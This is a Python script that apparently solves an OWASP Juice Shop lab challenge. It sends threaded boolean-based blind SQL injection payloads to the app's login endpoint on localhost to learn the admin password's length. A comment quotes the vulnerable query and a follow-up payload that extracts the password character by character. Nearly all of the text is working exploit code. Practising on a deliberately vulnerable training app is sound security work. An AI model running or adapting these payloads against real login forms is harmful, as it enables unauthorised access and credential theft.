import requests
import threading

'''
Vulnerability: SQL Injection
    models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: UserModel, plain: true }) // vuln-code-snippet vuln-line loginAdminChallenge loginBenderChallenge loginJimChallenge

Next Exploit:
{"email":"admin@juice-sh.op' and substring(password,1,1)='0' -- -","password":"admin123"}
'''

def make_request(i):
    data = {
        "email": f"admin@juice-sh.op' and length(password)={i} -- -",
        "password": "fff"
    }

    response = requests.post(url, headers=headers, cookies=cookies, json=data, proxies=proxies, verify=False)

    if "Invalid email or password" in response.text:
        pass
    else:
        print("Password Length: ", i)

if __name__ == "__main__":
    url = "http://localhost:3000/rest/user/login"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36",
    }

    cookies = {
        "language": "en",
    }

    proxies = {
        "http": "http://localhost:8080",
        "https": "http://localhost:8080",
    }

    threads = []
    for i in range(1, 35):
        t = threading.Thread(target=make_request, args=(i,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()